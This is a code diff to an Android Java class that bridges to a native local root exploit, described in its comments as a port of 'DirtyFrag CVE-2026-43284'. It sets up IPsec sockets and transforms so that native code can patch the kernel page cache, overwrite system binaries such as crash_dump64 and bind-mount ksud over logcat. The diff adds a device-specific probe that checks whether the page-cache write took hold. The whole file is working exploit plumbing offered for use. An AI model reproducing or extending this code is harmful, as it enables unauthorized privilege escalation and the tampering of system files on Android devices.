@@ -4,6 +4,7 @@ import android.content.Context;
 import android.net.IpSecAlgorithm;
 import android.net.IpSecManager;
 import android.net.IpSecTransform;
+import android.os.Build;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -18,7 +19,8 @@ import java.security.SecureRandom;
  * "New method (fast)" engine — port of diabl0w/DFRoot (DirtyFrag CVE-2026-43284).
  * Public APIs only: IpSecManager allocates the socket + SPI + transform, the
  * native engine (libexp/libexpnext) patches the kernel page cache and ksud
- * is bind-mounted over logcat. No root, no Shizuku, no profile.
+ * is bind-mounted over logcat. No root, no Shizuku, no profile. A059 first
+ * runs a source-built, non-root page-cache read-back preflight.
  *
  * NOTE: this is the EXACT 4.4.7 engine (the version whose manual Root now
  * was proven working on-device). The caller loads the native lib itself.
@@ -26,6 +28,7 @@ import java.security.SecureRandom;
 public final class DFBridge {
 
     private static boolean loaded = false;
+    private static boolean diagnosticLoaded = false;
 
     private DFBridge() {}
 
@@ -36,21 +39,35 @@ public final class DFBridge {
         loaded = true;
     }
 
+    /** Loads the A059-only native preflight; the main engine remains prebuilt. */
+    private static synchronized void loadDiagnostic() {
+        if (diagnosticLoaded) return;
+        System.loadLibrary("expdiag");
+        diagnosticLoaded = true;
+    }
+
     public static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                           byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                           int senderPort, boolean softReboot);
 
+    private static native int nativeProbeCrashDump(IReporter reporter, int encapPort, int spi,
+                                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
+                                                    int senderPort);
+
     /** One full privileged-free root run. Returns the engine rc (0 = rooted). */
     public static int run(Context context, boolean next, boolean softReboot, IReporter reporter) {
+        IpSecManager.UdpEncapsulationSocket encapSock = null;
+        IpSecManager.SecurityParameterIndex spiObj = null;
+        IpSecTransform transform = null;
         try {
             IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
 
-            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
+            encapSock = ipsec.openUdpEncapsulationSocket();
             int encapPort = encapSock.getPort();
             reporter.report("encap port: " + encapPort + "\n");
 
             InetAddress loopback = InetAddress.getByName("127.0.0.1");
-            IpSecManager.SecurityParameterIndex spiObj = ipsec.allocateSecurityParameterIndex(loopback);
+            spiObj = ipsec.allocateSecurityParameterIndex(loopback);
             int spiVal = spiObj.getSpi();
             reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
 
@@ -65,26 +82,63 @@ public final class DFBridge {
             int senderPort = senderSock.getLocalPort();
             senderSock.close();
 
-            IpSecTransform transform = new IpSecTransform.Builder(context)
+            transform = new IpSecTransform.Builder(context)
                     .setEncryption(enc)
                     .setAuthentication(auth)
                     .setIpv4Encapsulation(encapSock, senderPort)
                     .buildTransportModeTransform(loopback, spiObj);
+
+            // On A059 the native engine currently reports that crash_dump64
+            // was patched, but the device then runs the original Android binary.
+            // Verify the page-cache bytes before touching the vendor target.
+            if ("A059".equals(Build.MODEL)) {
+                try {
+                    loadDiagnostic();
+                } catch (Throwable t) {
+                    reporter.report("[diag] could not load A059 page-cache probe: " + t + "\n");
+                    return 3;
+                }
+                final int probe;
+                try {
+                    probe = nativeProbeCrashDump(reporter, encapPort, spiVal,
+                            aesKey, hmacKey, 128 / 8, senderPort);
+                } catch (Throwable t) {
+                    reporter.report("[diag] A059 page-cache probe failed: " + t + "\n");
+                    return 3;
+                }
+                if (probe != 0) {
+                    reporter.report("[diag] crash_dump64 page-cache write not confirmed; " +
+                            "stopping before vendor patch (rc=" + probe + ")\n");
+                    return 3;
+                }
+            }
 
             stageKsud(context, next, reporter);
 
             // The Next ksud CLI rejects --soft-reboot: never pass it there.
             boolean sb = next ? false : softReboot;
             int rc = nativeRunAll(reporter, encapPort, spiVal, aesKey, hmacKey, 128 / 8, senderPort, sb);
-
-            transform.close();
-            spiObj.close();
-            encapSock.close();
             return rc;
         } catch (Exception e) {
             reporter.report("\nexception: " + e + "\n");
             return -1;
+        } finally {
+            closeQuietly(transform);
+            closeQuietly(spiObj);
+            closeQuietly(encapSock);
         }
+    }
+
+    private static void closeQuietly(IpSecTransform value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
+    }
+
+    private static void closeQuietly(IpSecManager.SecurityParameterIndex value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
+    }
+
+    private static void closeQuietly(IpSecManager.UdpEncapsulationSocket value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
     }
 
     /** Stages the flavor's ksud (user-patched custom first, then bundled). */
